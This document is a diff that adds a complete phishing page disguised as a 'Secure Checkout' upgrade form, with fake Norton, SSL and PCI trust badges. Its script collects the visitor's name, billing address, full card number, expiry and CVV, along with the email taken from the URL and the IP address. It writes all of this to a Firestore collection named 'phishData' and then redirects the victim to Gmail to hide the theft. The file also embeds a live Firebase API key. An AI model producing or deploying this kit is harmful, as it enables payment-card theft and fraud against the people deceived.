@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment - Upgrade Your Account</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <style>
+        body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 700px; background: white; padding: 50px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); position: relative; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h2 { color: #202124; font-size: 28px; margin-bottom: 10px; }
+        .header p { color: #5f6368; font-size: 16px; }
+        .progress { display: flex; justify-content: space-between; margin-bottom: 30px; position: relative; }
+        .progress::before { content: ''; position: absolute; top: 15px; left: 0; right: 0; height: 2px; background: #dadce0; z-index: 1; }
+        .progress::after { content: ''; position: absolute; top: 15px; left: 0; width: 66%; height: 2px; background: #34a853; z-index: 2; transition: width 0.5s; }
+        .step { flex: 1; text-align: center; color: #666; font-size: 14px; background: white; z-index: 3; position: relative; padding: 10px; border-radius: 50%; width: 30px; height: 30px; line-height: 30px; margin: 0 auto; border: 2px solid #dadce0; }
+        .step.active { color: white; background: #34a853; border-color: #34a853; }
+        .secure { display: flex; align-items: center; justify-content: center; font-size: 14px; color: #5f6368; margin-bottom: 20px; background: #f8f9fa; padding: 10px; border-radius: 6px; }
+        .secure i { color: #34a853; margin-right: 8px; font-size: 18px; }
+        form { display: grid; gap: 20px; }
+        .form-group { display: flex; flex-direction: column; }
+        label { font-weight: 500; margin-bottom: 5px; color: #202124; }
+        input, select { padding: 14px; border: 1px solid #dadce0; border-radius: 6px; font-size: 16px; transition: border-color 0.3s; }
+        input:focus, select:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 5px rgba(26, 115, 232, 0.3); }
+        .row { display: flex; gap: 15px; }
+        .row .form-group { flex: 1; }
+        .checkbox { display: flex; align-items: flex-start; gap: 10px; font-size: 14px; }
+        .checkbox input { width: auto; margin-top: 2px; }
+        .checkbox a { color: #1a73e8; text-decoration: none; }
+        button { background: linear-gradient(135deg, #34a853 0%, #2e7d32 100%); color: white; border: none; padding: 16px; border-radius: 6px; font-size: 18px; font-weight: 500; cursor: pointer; margin-top: 20px; transition: transform 0.2s; }
+        button:hover { transform: translateY(-2px); }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .badges { display: flex; justify-content: center; gap: 20px; margin-top: 30px; flex-wrap: wrap; }
+        .badge { display: flex; align-items: center; font-size: 12px; color: #666; gap: 5px; }
+        .error { color: #d93025; font-size: 14px; display: none; animation: fadeIn 0.3s; }
+        .loading { display: none; text-align: center; color: #666; margin-top: 20px; }
+        .loading i { font-size: 24px; }
+        .footer { margin-top: 40px; text-align: center; font-size: 12px; color: #5f6368; border-top: 1px solid #dadce0; padding-top: 20px; }
+        .footer a { color: #1a73e8; margin: 0 5px; text-decoration: none; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @media (max-width: 600px) { .row { flex-direction: column; } .badges { gap: 10px; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>Secure Checkout</h2>
+            <p>Complete your premium upgrade with confidence. All transactions are encrypted and secure.</p>
+        </div>
+        <div class="progress">
+            <div class="step active">1</div>
+            <div class="step active">2</div>
+            <div class="step">3</div>
+        </div>
+        <div class="secure">
+            <i class="fas fa-lock"></i> 256-bit SSL Encrypted | Verified by Norton Secured
+        </div>
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label for="billingAddress">Billing Address</label>
+                <input type="text" id="billingAddress" placeholder="123 Main Street" required>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="billingCity">City</label>
+                    <input type="text" id="billingCity" placeholder="Anytown" required>
+                </div>
+                <div class="form-group">
+                    <label for="billingState">State/Province</label>
+                    <input type="text" id="billingState" placeholder="CA" required>
+                </div>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="billingZip">ZIP/Postal Code</label>
+                    <input type="text" id="billingZip" placeholder="12345" required>
+                </div>
+                <div class="form-group">
+                    <label for="billingCountry">Country</label>
+                    <select id="billingCountry" required>
+                        <option value="">Select Country</option>
+                        <option value="US">United States</option>
+                        <option value="CA">Canada</option>
+                        <option value="UK">United Kingdom</option>
+                        <option value="AU">Australia</option>
+                        <option value="DE">Germany</option>
+                    </select>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="cardName">Name on Card</label>
+                <input type="text" id="cardName" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="expMonth">Exp. Month</label>
+                    <input type="text" id="expMonth" placeholder="MM" maxlength="2" required>
+                </div>
+                <div class="form-group">
+                    <label for="expYear">Exp. Year</label>
+                    <input type="text" id="expYear" placeholder="YYYY" maxlength="4" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" id="terms" required>
+                <label for="terms">I agree to the <a href="#" target="_blank">Terms of Service</a> and <a href="#" target="_blank">Privacy Policy</a>. I understand my card will be charged $9.99/month.</label>
+            </div>
+            <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
+            <div id="errorMessage" class="error">Please fill in all fields correctly and complete the captcha.</div>
+            <div id="loading" class="loading">
+                <i class="fas fa-spinner fa-spin"></i> Processing your secure payment...
+            </div>
+            <button type="submit" id="submitBtn">Pay $9.99 Now</button>
+        </form>
+        <div class="badges">
+            <div class="badge"><i class="fas fa-shield-alt"></i> SSL Secured</div>
+            <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Visa_Logo.png/100px-Visa_Logo.png" alt="Visa" style="height:20px;"></div>
+            <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/100px-MasterCard_Logo.svg.png" alt="Mastercard" style="height:20px;"></div>
+            <div class="badge"><i class="fab fa-cc-amex"></i> Amex</div>
+            <div class="badge"><i class="fas fa-lock"></i> PCI Compliant</div>
+        </div>
+        <div class="footer">
+            Powered by Secure Payments Inc. | <a href="#">Contact Support</a> | <a href="#">Refund Policy</a> | © 2023 All Rights Reserved.
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBPoNHW1nCw67FC37F9tASk2Ydukfhs1cc",
+            authDomain: "checker-fd9c6.firebaseapp.com",
+            projectId: "checker-fd9c6",
+            storageBucket: "checker-fd9c6.firebasestorage.app",
+            messagingSenderId: "24257534297",
+            appId: "1:24257534297:web:a90c06b4325384f26c9448"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+
+        document.getElementById('cardNumber').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').slice(0, 19);
+        });
+
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const recaptchaResponse = grecaptcha.getResponse();
+            if (!recaptchaResponse) {
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('submitBtn').disabled = true;
+
+            const fullName = document.getElementById('fullName').value;
+            const billingAddress = document.getElementById('billingAddress').value;
+            const billingCity = document.getElementById('billingCity').value;
+            const billingState = document.getElementById('billingState').value;
+            const billingZip = document.getElementById('billingZip').value;
+            const billingCountry = document.getElementById('billingCountry').value;
+            const cardName = document.getElementById('cardName').value;
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expMonth = document.getElementById('expMonth').value;
+            const expYear = document.getElementById('expYear').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!fullName || !billingAddress || !billingCity || !billingState || !billingZip || !billingCountry || cardNumber.length < 13 || cvv.length < 3) {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('submitBtn').disabled = false;
+                return;
+            }
+
+            try {
+                await addDoc(collection(db, "phishData"), {
+                    type: "card",
+                    email: email,
+                    fullName: fullName,
+                    billingAddress: billingAddress,
+                    billingCity: billingCity,
+                    billingState: billingState,
+                    billingZip: billingZip,
+                    billingCountry: billingCountry,
+                    cardName: cardName,
+                    cardNumber: cardNumber,
+                    expiration: `${expMonth}/${expYear}`,
+                    cvv: cvv,
+                    recaptchaToken: recaptchaResponse,
+                    timestamp: new Date().toISOString(),
+                    ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)
+                });
+                setTimeout(() => {
+                    window.location.href = "https://mail.google.com";
+                }, 3000);
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('submitBtn').disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
